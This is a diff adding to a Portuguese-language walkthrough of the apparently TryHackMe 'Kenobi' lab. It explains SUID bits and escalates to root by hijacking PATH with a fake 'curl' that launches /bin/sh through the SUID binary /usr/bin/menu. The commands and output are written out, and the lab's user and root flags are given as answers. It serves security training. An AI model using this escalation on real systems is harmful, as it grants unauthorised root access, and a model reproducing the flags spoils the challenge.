@@ -324,4 +324,136 @@ Agora, basta ler o arquivo user.txt que está no home do usuário para responder
 
 - b. ***How many exploits are there for the ProFTPd running?*** *4*
 
-- c. ***What is Kenobi's user flag (/home/kenobi/user.txt)?*** 
+- c. ***What is Kenobi's user flag (/home/kenobi/user.txt)?*** *d0b0f3f53b6caa532a83915e19224899*
+
+## Task 4 - Privilege Escalation with Path Variable Manipulation 
+
+![Permissões especiais](images/special_permissions.png)
+
+Entendendo melhor o que são SUID, SGID e Sticky Bits.
+
+| Permissão | Em Arquivos | Em Diretórios |
+| --------- | ----------- | ------------- |
+| SUID Bit | O usuário executa o arquivo com permissões do proprietário do arquivo | \- |
+| SGID Bit | O usuário executa o arquivo com a permissão do grupo proprietário. | O arquivo criado no diretório obtém o mesmo grupo proprietário. |
+| Sticky Bit | Sem aplicação | Os usuários são impedidos de excluir arquivos de outros usuários. |
+
+Bits SUID podem ser perigosos, alguns binários como passwd precisam ser executados com privilégios elevados (como redefinir sua senha no sistema). No entanto, outros arquivos personalizados que tenham o bit SUID podem levar a problemas relacionados a elevação de privilégios.
+
+No texto da task é indicado como localizar arquivos com essas permissões:
+
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+O trecho "***2>/dev/null***" é para suprimir erros na tela.
+
+Execução:
+```shell
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+```
+Através da url [GTFOBins](https://gtfobins.github.io/), é possível ter uma fonte de consulta sobre binários que permitem elevação de privilégios.
+
+Um arquivo chama atenção: ***/usr/bin/menu***. Este será a resposta da questão ***a***.
+
+Executa-se esse arquivo para ver o que acontece.
+
+```shell
+kenobi@kenobi:~$ menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+HTTP/1.1 200 OK
+Date: Sun, 17 Jul 2022 13:31:52 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
+ETag: "c8-591b6884b6ed2"
+Accept-Ranges: bytes
+Content-Length: 200
+Vary: Accept-Encoding
+Content-Type: text/html
+```
+São exibidas inicialmente, 3 opções. Será a resposta da questão ***b***.
+
+Através do comando ***strings*** no Linux, é possível procurar textos legíveis por humanos em um binário.
+
+Execução:
+
+```shell
+strings /usr/bin/menu
+```
+Um trecho chama atenção:
+
+```shell
+curl -I localhost
+uname -r
+ifconfig
+```
+
+Trata-se dos comandos executados no S.O.
+
+O que pode ser feito é criar um arquivo chamado curl com um comando que chama a execução de um shell, pois o binário ***menu*** tem permissão SUID, logo, o comando de shell será executado com elevação de privilégios.
+
+Mas como fazer com que o binário ***menu*** execute  o curl "fake" ao invés do curl real? ***Através da manipulação da variável PATH***.
+
+Essa manipulação só é possível, porque na saída do comando strings, os comandos estão sendo usados sem o caminho absoluto (/usr/bin/curl, /usr/bin/uname, etc)
+
+Execução:
+
+```shell
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# 
+```
+
+Elevação de privilégios para usuário root obtida com sucesso!
+
+Basta ler o arquivo /root/root.txt para responder a questão ***d***.
+
+### Questões:
+
+- a. ***What file looks particularly out of the ordinary?*** */usr/bin/menu*
+
+- b. ***Run the binary, how many options appear?*** *3*
+
+- c. ***Apenas informações*** *Não há necessidade de resposta*
+
+- d. ***What is the root flag (/root/root.txt)?*** *177b3cd8562289f37382721c28381f02*
+
+
